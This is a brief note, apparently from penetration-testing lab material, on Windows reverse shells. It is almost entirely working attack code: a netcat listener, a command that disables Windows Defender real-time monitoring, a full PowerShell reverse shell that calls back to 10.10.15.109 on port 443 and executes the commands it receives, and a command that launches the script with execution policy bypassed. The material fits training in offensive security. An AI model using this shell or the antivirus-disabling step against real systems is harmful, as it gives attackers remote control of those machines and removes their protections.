# Reverse Shells

## Hands-on With A Simple Reverse Shell in Windows

Server (attack box)
sudo nc -lvnp 443

## Client (target)

### Disable AV

Set-MpPreference -DisableRealtimeMonitoring $true

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.109', 443)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

powershell -ExecutionPolicy Bypass -File .\s.ps1

Server (attack box)
sudo nc -lvnp 443
